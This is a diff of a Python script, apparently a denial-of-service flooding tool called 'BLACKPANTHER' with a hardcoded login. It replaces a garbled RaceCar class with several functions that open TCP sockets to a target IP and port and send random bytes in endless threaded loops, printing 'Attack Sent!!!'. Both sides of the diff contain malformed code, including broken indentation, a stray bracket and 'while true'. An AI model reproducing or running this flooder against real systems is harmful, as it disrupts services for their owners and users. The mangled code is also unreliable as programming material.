@@ -52,7 +52,7 @@ while attemps < 100:
     password = input("\033[94mEnter your password: \033[0m")
 
     if username == 'n0lk0ma' and password == 'n0lk0ma':
-        print("\033[33mHai...kamu berhasil login di BLACKPANTHER!!\033[0m")
+        print("***Hai...kamu berhasil login di BLACKPANTHER!!***")
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
@@ -80,62 +80,56 @@ def run():
 			print("[-] \033[97mError!!!\033[0m")
 
 
-class RaceCar:
-    def __init__(self,color,fuel_remaining,**kwargs):
-        self.color=color
-        self.fuel_remaining=fuel_remaining
-        self.laps = 0
-        for key,value in kwargs.items():
-            setattr(self,key,value)
+def run2():
+	data = random._urandom(999)
+	i = random.choice(("[+]"))
+	while true:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +"Attack Sent!!!")
+		except:
+			s.close()
+			print("[-] Error!!!")
+            
 
-    def run_lap(self,length):
-        self.length = length
-        self.fuel_remaining = self.fuel_remaining - (self.length * 0.125)
-        self.laps = self.laps + 1
-        data = random._urandom(999)
+def run3():
+	data = random._urandom(818)
+	i = random.choice(("[+]"))
 	while True:
 		try:
-		        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(i + "\033[33mVolume " +str(u)+ " \033[94mAttack " +ip+ "\033[0m")
-		except:
-		        s.close()
-		        print("[-] \033[31mError!!!\033[0m")
-            
-
-     def run3():
-	 data = random._urandom(818)
-	 while True:
-		 try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((ip,port))
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i + " \033[95mSending Massage\033[0m")
+			print(i +"Attack Sent!!!")
 		except:
 			s.close()
-			print("[-] \033[31mMaybe down...!\033[0m")
+			print("[-] Error!!!")
             
   
-      def run4():
-	  data = random._urandom(16)
-	  while True:
-		  try:
+def run4():
+	data = random._urandom(16)
+	i = random.choice(("[+]"))
+	while True:
+		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((ip,port))
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i + "\033[33mVolume " +str(u)+ " \033[94mAttack " +ip+ "\033[0m")
+			print(i +"Attack Sent!!!")
 		except:
 			s.close()
-			print("[-] \033[31mError!!!\033[0m"])
+			print("[-] Error!!!")
 
 
+											
+            
 for y in range(threads):
 	if choice == 'y':
 		th = threading.Thread(target = run)
